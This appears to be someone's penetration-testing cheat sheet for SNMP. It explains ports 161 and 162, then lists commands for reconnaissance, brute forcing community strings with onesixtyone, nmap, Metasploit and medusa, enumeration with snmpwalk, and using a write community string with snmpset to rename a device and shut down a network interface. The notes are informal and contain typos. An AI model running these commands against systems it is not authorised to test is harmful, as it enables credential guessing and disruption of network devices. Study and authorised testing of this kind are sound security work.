# SNMP Penetration Testing

## SNMP (Simple Network Management Protocol)

- **Ports:**  
  - 161/UDP (queries) This port is used for normal SNMP communication, where a management system asks a device for information.
	- ✔ What happens on port 161?
		- SNMP Manager → sends GET, GETNEXT, GETBULK, SET requests
		- SNMP Agent (router/switch/server) → responds back with the requested data . Ex

“What is your hostname?”  
  - 162/UDP (traps) This port is used by devices to send alerts / notifications to the SNMP manager without being asked.	
  	- ✔ What happens on port 162?
			- SNMP Agent → sends Trap messages to the SNMP Manager
			- These traps notify about important events instantly. Interface goes down/ High CPU usage
- **Purpose:** Network monitoring & device management
- **Common Devices:** Routers, switches, printers, servers, firewalls, UPS systems
- **Weakness:** SNMPv1/v2c use plaintext community strings (e.g., `public`, `private`)


161/UDP	SNMP	Manager → Device	Queries (GET/SET)
162/UDP	SNMP-Trap	Device → Manager	Alerts / Notifications

---

## Reconnaissance

```bash
nmap -sU -p161 <target>
nmap -sU -p 161 --script snmp-info <target>

snmpget -v2c -c public <target> sysDescr.0
```

### Community String Discovery
```bash
onesixtyone -c community.txt <target>

nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt <target>


Metasploit use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE community.txt
run

medusa -h 192.168.93.110 -u admin (no use of user's but still ned for medusa ) -P ssh_pass.txt -M snmp 

```
### Enumeration (After Valid Community Found)

```bash
snmpwalk -v2c/v1/ (version) -c <community-string> <target> 
snmpwalk -v2c -c <community> <target> system
snmpwalk -v2c -c <community> <target> interfaces
snmpwalk -v2c -c <community> <target> ipAddrTable

nmap -sU -p161 --script snmp-sysdescr,snmp-interfaces,snmp-processes,snmp-netstat <target>

snmpcheck  -c <community> <target>
```
### 4.3 Write-Access Exploitation (High Impact) If RW string found (e.g., "private"):

```bash
snmpset -v2c -c private <target> .1.3.6.1.2.1.1.5.0 s "HackedDevice"
snmpset -v2c -c private <target> .1.3.6.1.2.1.2.2.1.7.1 i 2 --> Shutdown interface


metasploit auxiliary/scanner/snmp/snmp_set 
snmptranslate -On iso.3.6.1.2.1.25.6.3.1.2.371 --> use output for msf-exploit i.e. OID

```